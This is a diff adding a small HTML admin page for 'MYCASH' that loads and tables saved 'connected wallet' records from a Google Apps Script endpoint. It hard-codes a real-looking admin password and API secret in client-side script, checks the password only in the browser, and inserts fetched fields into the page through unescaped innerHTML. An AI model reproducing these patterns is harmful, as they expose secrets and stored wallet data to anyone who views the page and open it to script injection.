@@ -1,0 +1,51 @@
+<!doctype html>
+<html><head><meta charset="utf-8"/><meta name="viewport" content="width=device-width,initial-scale=1"/><title>Admin — MYCASH</title>
+<style>
+body{font-family:system-ui;background:#0b1220;color:#e6eef8;margin:0}main{max-width:980px;margin:40px auto;padding:16px}
+.card{background:#071427;padding:18px;border-radius:12px;border:1px solid rgba(255,255,255,0.03)}
+input{padding:8px;border-radius:8px;border:1px solid #123044;background:#041525;color:#e6eef8}
+table{width:100%;border-collapse:collapse;margin-top:12px}th,td{padding:8px;border-bottom:1px solid rgba(255,255,255,0.03);text-align:left}
+th{color:#9fb0c8}
+</style>
+</head>
+<body>
+<main><div class="card"><h2>Admin — Connected Wallets</h2>
+<p class="muted">Enter admin password to view saved connections.</p>
+<input id="pw" type="password" placeholder="Admin password"/><button id="load" style="margin-left:8px;padding:8px 10px">Load</button>
+<div id="result" style="margin-top:12px"></div>
+</div></main>
+
+<script>
+const APPS_SCRIPT_URL = "https://script.google.com/macros/s/AKfycbw1jkXe1TTlNrl9PrUhyH_jD6F72cQxtFWOsxj3Kf-HpcEUKeIrhQquOjyt1inMhsd2/exec";
+const APPS_SCRIPT_SECRET = "mahfuzinam0045";
+const ADMIN_PASSWORD = "inam9900@@";
+
+document.getElementById("load").addEventListener("click", async ()=>{
+  const pw = document.getElementById("pw").value;
+  if (!pw) return alert("Enter password");
+  if (pw !== ADMIN_PASSWORD) return alert("Incorrect password");
+
+  const url = new URL(APPS_SCRIPT_URL);
+  url.searchParams.set("action","list");
+  url.searchParams.set("secret",APPS_SCRIPT_SECRET);
+
+  const r = await fetch(url.toString());
+  const data = await r.json().catch(()=>({error:"invalid"}));
+  if (!data || !data.success) return alert("Failed to load: "+ (data.error || JSON.stringify(data)));
+  const rows = data.data || [];
+  if (!rows.length) { document.getElementById("result").innerText = "No rows"; return; }
+
+  let html = '<table><thead><tr>';
+  const keys = Object.keys(rows[0]);
+  keys.forEach(k => html += '<th>'+k+'</th>');
+  html += '</tr></thead><tbody>';
+  rows.forEach(rw=>{
+    html += "<tr>";
+    keys.forEach(k => html += "<td>"+(rw[k]||"")+"</td>");
+    html += "</tr>";
+  });
+  html += "</tbody></table>";
+  document.getElementById("result").innerHTML = html;
+});
+</script>
+</body></html>
